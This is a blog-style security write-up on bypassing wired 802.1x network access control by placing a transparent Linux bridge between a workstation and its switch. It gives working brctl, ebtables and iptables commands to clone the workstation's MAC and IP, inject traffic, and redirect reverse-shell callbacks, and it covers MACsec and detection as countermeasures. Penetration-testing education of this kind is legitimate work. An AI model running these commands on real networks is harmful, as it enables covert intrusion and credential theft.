---
layout: post
title: "Wired NAC Bypass: Getting Past 802.1x"
date: 2026-04-20 10:00:00 +0000
categories: [network, nac, lateral-movement]
tags: [nac, 802.1x, eap-tls, network-bypass, bridge, iptables, ebtables, radius]
description: "How wired Network Access Control works, how to bypass it with a transparent bridge, and why 802.1ae is the only real fix"
permalink: /network/nac/lateral-movement/2026/04/20/NAC-Bypass.html
---

# Wired NAC Bypass: Getting Past 802.1x
*Sitting between a supplicant and a switch*

---

## What is NAC?

<div class="key-concept" markdown="1">
**NAC = Network Access Control** — validate a condition before granting access to the network, implemented at the switch level.
</div>

The idea is simple: before your device gets to talk to anything on the network, the switch checks that you're allowed to be there. This validation happens at **Layer 2** — meaning no DHCP, no ARP, nothing until you pass.

The device requesting access is called the **supplicant**. The switch enforces the policy. What it checks depends on the implementation.

### Common Implementations

- **MAC whitelisting** — the switch checks your MAC address against an allowed list. Trivially bypassable with MAC spoofing.
- **802.1x** — actual authentication. The switch acts as a relay between the supplicant and a RADIUS server. Different EAP variants define how authentication happens.
- **802.1ae (MACsec)** — encryption at Layer 2. More on this later.

---

## How 802.1x EAP-TLS Works

The full flow between supplicant, switch, and RADIUS server:

```
0. Traffic blocked at the switch
1. Supplicant sends EAPol-START
2. Switch replies with EAP-Request/Identity
3. Supplicant sends EAP-Response/Identity
4. Switch forwards to RADIUS → server sends TLS Start + its certificate
5. Supplicant verifies the server cert ✓
6. Supplicant sends Client Key Exchange
7. RADIUS verifies the supplicant's secret ✓
8. RADIUS sends Access-Accept to the switch
9. Switch sends EAP-Success
99. Traffic is now allowed ✓
```

<div class="key-concept" markdown="1">
The switch doesn't actually do the authentication — it's just a **passthrough relay** between the supplicant and the RADIUS server.
</div>

This is important for the attack: the switch trusts the traffic coming from the supplicant's port once authentication is done. It doesn't care about what device is actually plugged in.

---

## The Attack

### Attack Types

Three things you can do once you're physically in-line:

| Attack | Goal |
|--------|------|
| **Passive listening** | Study traffic baseline, catch cleartext secrets |
| **Traffic injection** | Run your pentest tools toward the internal network |
| **Traffic capture** | Catch callbacks (C2, reverse shells), run Responder |

### High-Level Setup

The attacker sits **between the supplicant and the switch**. The supplicant authenticates normally — you let all that EAP traffic pass through untouched. Once the switch opens the port, you inject your own traffic spoofing the supplicant's MAC and IP.

```
[Supplicant] ←eth0→ [Attack Box bridge br0] ←eth1→ [Switch] → [Internal Network]
                              ↑
                           wlan0 → attacker C2 (optional, out-of-band)
```

<div class="warning-box" markdown="1">
**Key trick:** The switch only sees traffic from eth1 (your box → switch side). As long as you spoof the supplicant's MAC and IP, the switch thinks it's legitimate traffic.
</div>

---

## Step 1 — Passive Listening

Before doing anything active, just set up a transparent bridge and listen. Zero traffic injection, zero risk of detection.

```bash
# Create the bridge
brctl addbr br0
brctl addif br0 eth0   # supplicant side
brctl addif br0 eth1   # switch side

# Forward EAP packets across the bridge (critical)
echo 8 > /sys/class/net/br0/bridge/group_fwd_mask

# Bring interfaces up in promiscuous mode
ifconfig eth0 0.0.0.0 up promisc
ifconfig eth1 0.0.0.0 up promisc
ifconfig br0  0.0.0.0 up promisc

# Capture everything
tcpdump -i eth0 -w capture.pcap
```

<div class="success-box" markdown="1">
The `group_fwd_mask = 8` is what makes this work — without it, EAP packets are consumed by the bridge and never forwarded, breaking the supplicant's authentication.
</div>

What to look for in the capture:
- Cleartext credentials (HTTP, FTP, SMTP, LDAP without TLS)
- NTLM challenge/response hashes
- Internal hostnames and IP ranges
- Any traffic that tells you what lives on this network

---

## Step 2 — Traffic Injection

Now you want to actually send packets from your box as if you were the supplicant. This requires:

1. Enable forwarding and bridge netfilter
2. Set up routing through the bridge
3. NAT your MAC and IP to match the supplicant

### 2.1 — Enable Forwarding

```bash
sysctl -w net.ipv4.ip_forward=1
modprobe br_netfilter
echo 1 > /proc/sys/net/bridge/bridge-nf-call-iptables
```

### 2.2 — Routing Setup

```bash
GATEWAY_MAC="34:34:34:34:34:34"   # real gateway MAC
SUPPLICANT_MAC="12:12:12:12:12:12" # supplicant's MAC
SUPPLICANT_IP="192.168.10.12"      # supplicant's IP
BRIDGE_GW_IP="169.254.66.1"        # arbitrary IP for the bridge gateway
BRIDGE_ATK_IP="169.254.66.66"      # arbitrary IP for your attack box

# Give your box an IP on the bridge
ifconfig br0 $BRIDGE_ATK_IP up promisc

# Tell the bridge the gateway's real MAC is reachable at BRIDGE_GW_IP
arp -s -i br0 $BRIDGE_GW_IP $GATEWAY_MAC

# Default route through the bridge
route add default gw $BRIDGE_GW_IP dev br0 metric 10
```

### 2.3 — Spoof Supplicant MAC & IP

```bash
# L2 NAT — rewrite your source MAC to match the supplicant
ebtables -t nat -A POSTROUTING -o eth1 -j snat --to-src $SUPPLICANT_MAC
ebtables -t nat -A POSTROUTING -o br0  -j snat --to-src $SUPPLICANT_MAC

# L3 NAT — rewrite your source IP to match the supplicant
iptables -t nat -A POSTROUTING -o br0 -s $BRIDGE_ATK_IP -p tcp  -j SNAT --to $SUPPLICANT_IP:61000-62000
iptables -t nat -A POSTROUTING -o br0 -s $BRIDGE_ATK_IP -p udp  -j SNAT --to $SUPPLICANT_IP:61000-62000
iptables -t nat -A POSTROUTING -o br0 -s $BRIDGE_ATK_IP -p icmp -j SNAT --to $SUPPLICANT_IP
```

From the switch's perspective, everything coming out of eth1 looks exactly like the legitimate supplicant. You can now run nmap, run your pentest tools, or interact with internal services.

---

## Step 3 — Traffic Capture

Want to catch a reverse shell or C2 callback that's supposed to land on the supplicant? Redirect it to your box.

```bash
# Redirect traffic destined for supplicant:8000 → your box:8888
iptables -t nat -A PREROUTING -i br0 -d $SUPPLICANT_IP -p tcp --dport 8000 \
    -j DNAT --to $BRIDGE_ATK_IP:8888
```

This lets you run Responder, catch NTLM hashes, or intercept callbacks without touching the supplicant at all.

---

## Tools

### Off-the-Shelf Hardware

Commercial NAC bypass devices exist — they're cheap and easy to use. Downside: they only do traffic injection, you can't debug them when they misbehave (and they will), and customization is impossible.

### scipag/nac_bypass (GitHub)

<div class="tool-showcase" markdown="1">
**[https://github.com/scipag/nac_bypass](https://github.com/scipag/nac_bypass)**

Scripted version of everything above. Fast to deploy, acceptable OPSEC, fully customizable.
</div>

Works well out of the box for most engagements. One warning: **be careful with auto mode** — it makes assumptions about the network that can cause issues if the environment is non-standard.

### Key Features

- Automatic supplicant/gateway detection
- Full bridge setup in one script
- Customizable for any environment
- Support for C2 traffic capture
- Bidirectional traffic injection (inject toward supplicant too)

---

## Countermeasures

### 802.1ae (MACsec)

802.1ae adds **Layer 2 encryption** between the supplicant and the switch. Here's what it kills:

<div class="success-box" markdown="1">
- **Passive listening** — traffic is encrypted, you can see frames but not read them
- **Traffic injection** — you don't have the session key negotiated in the EAP/TLS session
- **Traffic capture** — you can capture frames but can't decrypt or respond to them
</div>

Sounds perfect. The catch:

<div class="vulnerability-alert" markdown="1">
**802.1ae deployment is a nightmare:**
- Requires 802.1x everywhere first
- Every switch must support it
- Every supplicant needs a compatible NIC (dedicated hardware, high-end — a lot of standard workstations don't qualify)
- IoT devices, printers, and most embedded systems simply can't do it
</div>

So in practice, you won't see it deployed across a full enterprise. It might exist on specific high-security segments.

### WiFi is Actually Better Here

WPA-Enterprise (802.11i) provides robust encryption between the supplicant and the access point, and hardware support has been standard for years across all device types. Physical in-line positioning is also much harder on wireless. If your threat model includes NAC bypass, WiFi with WPA-Enterprise is ironically more resilient than wired 802.1x without MACsec.

### Detection

<div class="warning-box" markdown="1">
**The bad news:** A properly executed NAC bypass is **invisible at the network level**. From the switch's perspective, everything looks like legitimate supplicant traffic.
</div>

What you *can* detect:

- **Unusual traffic patterns** from the supplicant's IP (port scans, unexpected protocols, new destinations)
- **Kill chain artifacts** — lateral movement, recon, credential access events downstream
- **Behavioral anomalies** — the supplicant scanning the network at 2am
- **Volume spikes** — sudden bandwidth increase from a device that normally does nothing

Important: if you detect this, don't assume the supplicant itself is compromised. An attacker in-line will spoof its identity but the supplicant machine may be completely clean.

---

## Key Takeaways

<div class="takeaway-box" markdown="1">
**MAC whitelisting is useless** — trivially bypassed with MAC spoofing before you even need a bridge
</div>

<div class="takeaway-box" markdown="1">
**802.1x is bypassable** — the switch trusts the port after auth, not the device
</div>

<div class="takeaway-box" markdown="1">
**Transparent bridge = zero footprint** — passive listening is completely undetectable
</div>

<div class="takeaway-box" markdown="1">
**ebtables + iptables = full identity spoofing** — L2 and L3 NAT to clone the supplicant
</div>

<div class="takeaway-box" markdown="1">
**802.1ae is the real fix** — but hardware support makes it rarely deployable at scale
</div>

<div class="takeaway-box" markdown="1">
**Detect downstream, not inline** — look for kill chain artifacts, not the bypass itself
</div>

---

## References

- [scipag/nac_bypass](https://github.com/scipag/nac_bypass)
- [IEEE 802.1x Standard](https://www.ieee802.org/1/pages/802.1x.html)
- [IEEE 802.1ae (MACsec)](https://www.ieee802.org/1/pages/802.1ae.html)
- [hostapd/wpa_supplicant](https://w1.fi/wpa_supplicant/)
- [ebtables documentation](https://ebtables.netfilter.org/)
